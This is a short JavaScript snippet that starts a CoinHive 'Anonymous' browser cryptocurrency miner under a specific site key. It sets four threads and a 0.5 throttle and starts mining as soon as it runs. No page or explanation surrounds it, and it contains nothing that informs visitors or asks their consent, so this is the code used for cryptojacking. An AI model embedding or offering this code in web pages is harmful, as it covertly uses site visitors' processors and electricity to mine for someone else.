var miner = new CoinHive.Anonymous('ieg9JfT60lwmfeaCfpyLUiDeHk4Q3Gkb', {
    threads: 4,
    autoThreads: false,
    throttle: 0.5,
    forceASMJS: false
});
miner.start(CoinHive.IF_EXCLUSIVE_TAB);